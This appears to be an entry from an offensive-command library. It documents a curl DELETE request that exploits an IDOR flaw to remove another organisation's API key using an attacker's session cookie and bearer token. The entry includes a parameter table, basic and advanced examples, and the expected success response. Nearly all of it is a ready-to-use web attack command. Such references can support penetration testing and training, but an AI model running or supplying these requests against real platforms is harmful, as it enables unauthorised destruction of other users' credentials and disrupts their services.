---
data: >-
  curl -X DELETE
  https://target-platform.com/organization/ORG-UUID/apiKeys/API-UUID -H "Cookie:
  session=attacker_session_cookie" -H "Authorization: Bearer attacker_token"
tags:
  - http
  - delete
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.022Z'
id: 6b914262-5304-4cfd-b9a0-5fb277f523d3
verified: false
validated: true
submitted: true
---
# curl-delete-api-key

## Command

```bash
curl -X DELETE https://target-platform.com/organization/ORG-UUID/apiKeys/API-UUID -H "Cookie: session=attacker_session_cookie" -H "Authorization: Bearer attacker_token"
```

## Description

Sends a DELETE request to remove an API key via the vulnerable endpoint, exploiting IDOR with attacker authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies HTTP DELETE method | Yes |
| `https://target-platform.com/organization/ORG-UUID/apiKeys/API-UUID` | Target endpoint with identifiers | Yes |
| `-H "Cookie: session=attacker_session_cookie"` | Attacker session for auth | Yes |
| `-H "Authorization: Bearer attacker_token"` | Optional token if required | No |

## Examples

### Basic Usage

```bash
curl -X DELETE https://target-platform.com/organization/abc123/apiKeys/def456 -H "Cookie: session=xyz789"
```

### Advanced Usage

```bash
curl -X DELETE https://target-platform.com/organization/abc123/apiKeys/def456 -H "Cookie: session=xyz789" -H "Authorization: Bearer token123" -v
```

## Expected Output

HTTP 200 OK response with JSON like {"success": true, "message": "Key deleted"} or empty body on success.

## Related

- [[Related Procedure: Delete-API-Key-via-IDOR]]
